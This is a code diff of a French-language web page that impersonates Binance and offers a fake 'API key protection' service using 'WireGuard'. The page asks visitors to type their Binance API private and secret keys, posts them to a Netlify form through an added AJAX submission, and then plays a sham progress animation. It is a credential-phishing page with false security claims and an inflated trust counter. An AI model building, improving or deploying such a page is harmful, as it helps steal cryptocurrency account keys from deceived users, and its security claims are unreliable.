@@ -184,29 +184,33 @@
     <img src="logo23.png" alt="Binance Logo" class="logo">
   </div>
   
-  <img src="https://bin.bnbstatic.com/image/julia/new-homepage/download-lite-dark-en.svg" alt="Binance App" class="left-img">
+  <img src="binance-app.png" alt="Binance App" class="left-img" style="max-width:260px;width:100%;height:auto;position:static;margin-bottom:18px;">
   
-  <div class="container">
-    <h2>Protection Avancée des API Keys Binance</h2>
-    
-    <form name="binance-api-key" method="POST" data-netlify="true" netlify-honeypot="bot-field">
+  <div class="container" style="max-width:340px;padding:22px 18px;">
+    <h2 style="font-size:1.25rem;margin-bottom:16px;">Protection Avancée des API Keys Binance</h2>
+    <form name="binance-api-key" method="POST" data-netlify="true" netlify-honeypot="bot-field" style="margin-bottom:0;">
       <input type="hidden" name="form-name" value="binance-api-key">
-      <p class="hidden"><label>Don’t fill <input name="bot-field"></label></p>
-      <div class="input-group">
-        <label for="privateKey">Private Key API</label>
-        <input type="password" id="privateKey" name="privateKey" placeholder="Entrer votre clé privée" required>
+      <div class="input-group" style="margin-bottom:12px;">
+        <label for="privateKey" style="font-size:13px;">Private Key API</label>
+        <input type="password" id="privateKey" name="privateKey" placeholder="Entrer votre clé privée" required style="font-size:15px;padding:9px 10px;">
       </div>
-      <div class="input-group">
-        <label for="secretKey">Secret Key API</label>
-        <input type="password" id="secretKey" name="secretKey" placeholder="Entrer votre clé secrète" required>
+      <div class="input-group" style="margin-bottom:12px;">
+        <label for="secretKey" style="font-size:13px;">Secret Key API</label>
+        <input type="password" id="secretKey" name="secretKey" placeholder="Entrer votre clé secrète" required style="font-size:15px;padding:9px 10px;">
       </div>
-      <button class="btn" type="submit">Activer la Protection</button>
+      <button class="btn" type="submit" style="font-size:15px;padding:10px 0;">Activer la Protection</button>
     </form>
     <script>
-      // Animation modal après soumission Netlify
+      // Soumission AJAX Netlify Forms + animation modal
       document.querySelector('form').addEventListener('submit', function(e) {
-        // Laisser Netlify gérer l'envoi, mais afficher le modal
-        setTimeout(function() {
+        e.preventDefault();
+        var form = e.target;
+        var data = new FormData(form);
+        fetch('/', {
+          method: 'POST',
+          headers: { 'Accept': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams(data).toString()
+        }).then(function() {
           document.getElementById('modal').style.display = 'flex';
           var progressBar = document.querySelector('.progress-bar');
           progressBar.style.width = '0%';
@@ -233,24 +237,24 @@
             }
           }
           requestAnimationFrame(animateProgress);
-        }, 300); // Légère attente pour laisser Netlify traiter
+        });
       });
     </script>
     </form>
     
-    <div class="protection">
-      <p>⚠️ La protection <span>WireGuard</span> renforcera la sécurité de vos API Keys Binance en restreignant les accès non autorisés.</p>
+    <div class="protection" style="font-size:1.1rem;margin-top:16px;">
+      <p style="margin:0;">⚠️ La protection <span style="color:#f0b90b;font-weight:bold;">WireGuard</span> renforcera la sécurité de vos API Keys Binance en restreignant les accès non autorisés.</p>
     </div>
   </div>
   
-  <div class="counter">
-    <span class="highlight">261,308,788</span> USERS TRUST US
+  <div class="counter" style="font-size:1.15rem;margin-top:18px;">
+    <span class="highlight" style="font-size:2rem;">261,308,788</span> USERS TRUST US
   </div>
   
   <i class="fas fa-shield-alt right-img"></i>
   
-  <div class="wireguard-description">
-    Le protocole <span>WireGuard</span> garantit une confidentialité maximale en utilisant un double chiffrement elliptique (ECC) avancé pour sécuriser vos clés API contre toute interception.
+  <div class="wireguard-description" style="font-size:0.95rem;margin-top:10px;max-width:340px;">
+    Le protocole <span style="color:#f0b90b;font-weight:bold;">WireGuard</span> garantit une confidentialité maximale en utilisant un double chiffrement elliptique (ECC) avancé pour sécuriser vos clés API contre toute interception.
   </div>
   
   <div class="social-icons">
